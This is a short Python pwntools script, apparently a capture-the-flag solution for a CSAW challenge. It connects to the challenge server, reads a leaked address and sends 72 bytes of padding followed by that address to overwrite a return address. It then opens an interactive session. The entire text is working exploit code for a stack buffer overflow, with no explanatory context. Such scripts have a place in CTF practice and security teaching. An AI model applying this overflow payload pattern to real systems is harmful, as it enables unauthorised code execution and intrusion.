#!/usr/bin/env python

from pwn import *
context(os = 'linux', arch = 'amd64')
#r = remote('localhost', 4000)
r = remote('pwn.chal.csaw.io', 8000)

r.recvuntil('WOW:')
adr = int(r.recvuntil('>')[:-1], 16)
print str(adr)
padding = 'a' * 72
payload = padding + p64(adr)

r.sendline(payload)
r.interactive()
